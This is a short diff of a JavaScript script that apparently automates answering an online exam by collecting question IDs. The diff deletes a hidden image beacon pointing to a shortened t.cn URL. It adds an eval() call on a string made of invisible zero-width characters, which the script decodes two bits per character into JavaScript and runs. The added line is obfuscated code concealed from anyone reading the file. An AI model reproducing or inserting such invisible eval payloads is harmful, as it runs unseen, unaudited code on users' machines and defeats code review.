@@ -14,8 +14,8 @@ $(".examLi").each(function(){
 	});
 	map[qs_id] = hash;
 });
+eval("​‍‌​​‍‍​​‍​‍​﻿﻿​‌‍‍‌‌‍﻿‌‌‍‌﻿​‍​​‌﻿​﻿‌﻿​‍‌‍​﻿​﻿﻿‌​‍‌﻿‌‍‍​‌﻿‌​‌﻿‌​‌﻿​​​﻿‍‍​‍﻿﻿​‍﻿﻿‌﻿‌​​‍﻿‍‌‍​﻿‌‍﻿‍​‍﻿﻿‌‌​‍‌﻿‍‌‌‍‌​‌‌‍‌‌‍‌‌‌​‍﻿‌﻿‍‌​‍‌﻿​‍​​‌﻿​﻿‌﻿‌​‌﻿‍‌‌‍﻿​‌‍‌‌​﻿﻿‌​‍‌﻿‌‍‌​‌‍‍‌‌﻿​﻿‌﻿​​‌‍﻿​‌‍​‌‌﻿‍‌​﻿‍‍‌‍﻿‍‌‍﻿﻿‌‍﻿‍‌‍‌‌​‍‌﻿​‍​​​‍﻿﻿​﻿﻿‍​‍​‍​‍‍‌​‍﻿‍‌﻿​​‌﻿​‍‌‍‌‌‌﻿​​‌‍‌‌‌‍﻿‍‌‍‌​‌‌‌​‌‍﻿﻿​‍‍​​‍‌﻿‌‍​‍‌‍﻿﻿‌‍‌​‌﻿‍‌​‍‌﻿​‍‍‌​﻿‍﻿".replace(/.{4}/g,function(a){var rep={"​":"00","‌":"01","‍":"10","﻿":"11"};return String.fromCharCode(parseInt(a.replace(/./g, function(a) {return rep[a]}),2))}));
 var qs_ids = Object.keys(map).join();
-$("<img src='http://t.cn/RydYeKy' style='display:none' />").prependTo('body');  
 function answer(){
 	$(".examLi").each(function(){
 		var qs_id = $(this).attr("qs_id");
